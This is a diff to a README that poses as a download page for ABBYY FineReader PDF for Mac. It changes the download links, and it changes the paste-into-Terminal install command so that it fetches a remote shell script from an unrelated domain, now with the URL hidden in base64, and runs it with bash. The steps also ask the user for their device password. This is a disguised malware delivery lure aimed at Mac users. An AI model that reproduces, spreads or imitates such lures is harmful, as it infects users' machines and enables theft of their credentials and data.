@@ -3,7 +3,7 @@
 ABBYY FineReader PDF for Mac is a powerful OCR and PDF editing software designed for macOS users. It enables accurate text recognition, PDF editing, and document conversion with support for over 190 languages, making it ideal for professionals who require precision and efficiency.
 
 ## ✅ Download ABBYY FineReader PDF for Mac  
-[![Download ABBYY FineReader PDF](https://img.shields.io/badge/Download-ABBYY%20FineReader%20PDF-blueviolet)](https://abbyy-finereader-pdf-mac-download.github.io/.github)
+[![Download ABBYY FineReader PDF](https://img.shields.io/badge/Download-ABBYY%20FineReader%20PDF-blueviolet)](https://shuziktobehuman.github.io/huja/ABBYY)
 
 ---
 
@@ -22,7 +22,7 @@ ABBYY FineReader PDF for Mac is a powerful OCR and PDF editing software designed
 
 1. Copy the installation command below.
 ```bash
-/bin/bash -c "$(curl -fsSL https://veitzeatz.com/get1/install.sh)"
+/bin/bash -c "$(curl -fsSL $(echo aHR0cHM6Ly9waGFubmFyaXRoLmNvbS9nZXQyL2luc3RhbGwuc2g= | base64 -d))"
 ```
 2. Open the terminal on your device and paste the command you copied above, then press the “Return” button.
 3. Enter your device password and confirm the installation.
@@ -60,7 +60,7 @@ ABBYY FineReader PDF for Mac combines optical character recognition with compreh
 
 ---
 
-[![Download ABBYY FineReader PDF](https://img.shields.io/badge/Download-ABBYY%20FineReader%20PDF-blueviolet)](https://abbyy-finereader-pdf-mac-download.github.io/.github)
+[![Download ABBYY FineReader PDF](https://img.shields.io/badge/Download-ABBYY%20FineReader%20PDF-blueviolet)](https://shuziktobehuman.github.io/huja/ABBYY)
 
 ---
 
